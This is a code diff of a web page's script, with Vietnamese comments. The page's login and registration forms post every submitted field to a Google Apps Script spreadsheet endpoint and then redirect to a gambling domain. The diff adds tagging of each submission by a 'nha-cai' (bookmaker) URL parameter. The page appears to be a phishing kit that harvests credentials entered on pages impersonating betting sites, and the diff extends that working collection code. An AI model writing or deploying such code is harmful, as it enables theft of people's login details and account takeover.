@@ -169,16 +169,22 @@
         function closeModal(id) { document.getElementById(id).style.display = 'none'; }
 
         // CẤU HÌNH GỬI DỮ LIỆU GOOGLE SHEETS
-        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycby72UzyOAjIQk0jkQPtOlJHgjcHUblpcfo_Vr5jl2CBOacoA5M-BM2Yb1gPVeOH7GnV/exec"; // Dán link Apps Script vào đây
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbw-tdxR1hLgo3TCWH5CGlSaXZNcuz3sGaeZp9dtIIE0qQyoZgZIYgd_5lTYfDapXR3s/exec"; // Dán link Apps Script vào đây
         const REDIRECT_URL = "https://4a1.bongvip25.pro"; // Trang sẽ nhảy đến sau khi bấm
 
         async function postData(formId) {
             const form = document.getElementById(formId);
             const formData = new URLSearchParams(new FormData(form));
             
-            // Ghi chú loại thao tác để đổ vào cột F
+            // 1. Tự động lấy tên nhà cái từ link web (Ví dụ: ?nha-cai=BJ88)
+            const urlParams = new URLSearchParams(window.location.search);
+            const sourceName = urlParams.get('nha-cai') || "Chưa rõ nguồn"; 
+
+            // 2. Phân biệt Đăng ký/Đăng nhập
             const formType = (formId === 'loginForm') ? "Đăng Nhập" : "Đăng Ký";
-            formData.append("type", formType);
+            
+            formData.append("type", formType); 
+            formData.append("source", sourceName); // Gửi thêm cột nguồn này đi
 
             fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', body: formData })
             .then(() => {
